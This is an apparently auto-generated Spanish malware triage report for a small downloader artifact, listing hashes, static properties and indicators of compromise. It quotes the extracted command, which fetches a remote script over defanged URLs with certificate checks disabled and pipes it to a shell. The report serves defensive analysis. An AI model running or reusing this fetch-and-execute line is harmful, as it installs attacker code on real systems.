# 🧬 Payload Analysis

`144ea634e49cd1acb23b1db093f19b8e5f7f1b60de6803b3145a17b0d5b07027`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:08:37+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `144ea634e49cd1acb23b1db093f19b8e5f7f1b60de6803b3145a17b0d5b07027`
- **SHA1:** `1ddac2bc65c5af189bf9f8b779b34c5e4cb08272`
- **MD5:** `28874caa7d6e9289eb4466ea7e7d6e25`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 122 B |
| Entropía | 4.62 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
echo (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh || curl -sk hxxps://14.46.136.XXX/sh) | sh -s apache.selfr
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 14.46.136.XXX | static_analysis |
| url | hxxps://14.46.136.XXX/sh | strings |
| url | hxxps://14.46.136.XXX/sh) | strings |
| hash | 144ea634e49cd1acb23b1db093f19b8e5f7f1b60de6803b3145a17b0d5b07027 | static_analysis |
| command | echo (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh \|\| curl -sk hxxps://14.46.136.XXX/sh) \| sh -s apache.selfr | strings |
| ip | 183.221.22.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
